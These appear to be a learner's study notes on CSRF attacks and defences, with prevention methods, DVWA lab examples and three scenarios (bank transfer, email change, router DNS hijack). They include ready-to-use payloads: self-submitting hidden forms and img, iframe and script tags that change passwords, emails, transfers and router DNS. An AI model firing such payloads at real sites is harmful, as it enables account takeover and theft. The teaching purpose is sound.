# Cross-Site Request Forgery (CSRF / XSRF)


# cokkie nhi jata attacker ke pass jo usne form mr action kiya hai wo hoga 
### like webapplication gives ne cookie when i visit website in every request my browser sent cokkie to web for mainting session but when cookie set to same site none then attaccker create a form inside this form there is a action from this web then victim click the link the form action proccrds in browser browser sent cookie  to web beacuse of cookie set none  and attcker action done

> **Definition:** A web security attack where an attacker tricks an authenticated user into submitting unauthorized commands to a web application where they are logged in.

---

## How CSRF Works

An attacker creates a malicious form or script that submits a request to a target website using the victim's credentials (usually stored in cookies).

If the user is logged into the website, their browser **automatically includes their authentication cookie**, and the website processes the malicious request as legitimate.

### Example — Malicious Form

```html
<form action="https://vulnerable-website.com/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>
  document.forms[0].submit();
</script>
```

---

## CSRF Prevention

Common prevention methods include:

- **CSRF Tokens** — Embed unique tokens within forms and verify them on the server.
- **Referer Header Check** — Check the `Referer` or custom HTTP headers.
- **SameSite Cookie** — Use the `SameSite` cookie attribute to restrict cross-site requests.
- **Custom Headers via fetch()** — Require non-simple requests via JavaScript `fetch()` with custom headers.

### Example — CSRF Token in a Form

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="amount" value="100" />
  <input type="hidden" name="csrf_token" value="random-generated-token" />
  <button type="submit">Transfer</button>
</form>
```

The server only processes the request if the `csrf_token` received **matches the token it generated previously**.

---

## CSRF Trigger Tags

HTML elements used by attackers to automatically send forged requests when a victim loads a malicious page. These bypass user interaction for GET or simple POST requests.

|Tag|How It Works|
|---|---|
|`<img>`|Triggers GET via `src` attribute — browser loads the "image", sending parameters silently|
|`<iframe>`|Loads target URL in a hidden frame, often styled with zero dimensions|
|`<script>`|Loads JS from target `src` — better for dynamic exploits|

### Examples targeting DVWA

```html
<!-- img tag -->
<img src="http://192.168.1.45/dvwa/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change">

<!-- iframe tag -->
<iframe src="http://192.168.1.45/dvwa/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change"></iframe>

<!-- script tag -->
<script type="text/javascript" src="http://192.168.1.45/dvwa/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change"></script>
```

---

## Real-Life CSRF Scenarios

### Scenario 1 — Bank Transfer Attack

**Target:** Online banking portal  
**Victim:** Alice, logged into her bank at `bank.com`

**What happens:**

1. Alice receives a phishing email: _"Congratulations! Claim your $500 reward!"_
2. She clicks the link — it opens a page on `evil.com`
3. The page silently contains:

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to"     value="attacker_account" />
  <input type="hidden" name="amount" value="5000" />
</form>
<script>document.forms[0].submit();</script>
```

4. Alice's browser auto-sends her session cookie with the request
5. The bank processes it — **$5,000 transferred** without Alice's knowledge

**Why it works:** The bank only checks if the session cookie is valid, not where the request came from.

---

### Scenario 2 — Social Media Account Takeover

**Target:** Social media platform  
**Victim:** Bob, logged into `socialapp.com`

**What happens:**

1. Bob visits a forum post with an embedded malicious image:

```html
<img src="https://socialapp.com/settings/email/change?new_email=hacker@evil.com">
```

2. The browser fetches the "image" URL — which is actually an account settings endpoint
3. Bob's session cookie is sent automatically
4. **Bob's email is changed** to the attacker's address
5. Attacker now uses "Forgot Password" to take full control

**Why it works:** The platform accepts GET requests for state-changing operations — a critical mistake.

---

### Scenario 3 — Router Admin Panel Hijack

**Target:** Home Wi-Fi router admin panel at `192.168.1.1`  
**Victim:** Carol, whose router is on default credentials

**What happens:**

1. Carol visits a malicious website while on her home network
2. The page fires a hidden request to her router:

```html
<img src="http://192.168.1.1/admin/dns?primary=8.8.4.4&secondary=attacker-dns.com">
```

3. The router's admin panel has no CSRF protection
4. **DNS settings are changed** to route traffic through the attacker's server
5. Attacker now performs DNS hijacking — intercepting Carol's banking logins

**Why it works:** Router admin panels often skip CSRF protection since they're on "internal" networks — but any page Carol visits can reach it.

---

## Summary

||Vulnerable|Protected|
|---|---|---|
|Session Cookie|Auto-sent ✓|Auto-sent ✓|
|CSRF Token|✗ Not checked|✓ Verified server-side|
|SameSite Cookie|`None`|`Strict` / `Lax`|
|Attack Result|**Request executed**|**403 Forbidden**|

> This document outlines the basic mechanism of CSRF attacks and defenses, illustrating how attackers exploit browser trust and how sites can verify genuine requests.